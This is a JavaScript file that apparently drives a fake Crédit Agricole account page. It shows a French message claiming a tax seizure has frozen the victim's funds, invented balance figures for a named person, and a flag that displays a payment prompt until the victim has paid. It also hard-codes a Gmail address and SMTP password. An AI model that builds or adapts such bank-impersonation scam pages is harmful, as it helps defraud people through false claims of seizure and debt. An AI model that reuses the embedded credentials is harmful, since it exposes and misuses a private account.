var message =
  "À la suite d’une Saisie Administrative, le Crédit Agricole est tenu de bloquer l’ensemble des opérations bancaires ainsi que les fonds disponibles sur votre compte jusqu’à la régularisation de votre dette fiscale. Contacter votre gestionnaire pour plus d'information.";
var name = "Stéphanie Buche";
var solde = "1.823.570";
var epargne = "12.000";

var smtp = "smtp.gmail.com";
var port = "587";
var email = "davidcaron6562@gmail.com";
var pass = "pxpb msua prls isfr";

// Si il as deja payer !
var DejaPayer = false;

if (!DejaPayer) {
  document.getElementById("aPayer").classList.remove("hidden");
}

// add solde and epargne to local storage
localStorage.setItem("solde", solde);
localStorage.setItem("epargne", epargne);

document.getElementById("messageId").innerText = message;
document.getElementById("clientName").innerText = name;
document.getElementById("soldeClient").innerText = solde;
document.getElementById("epargneId").innerText = epargne;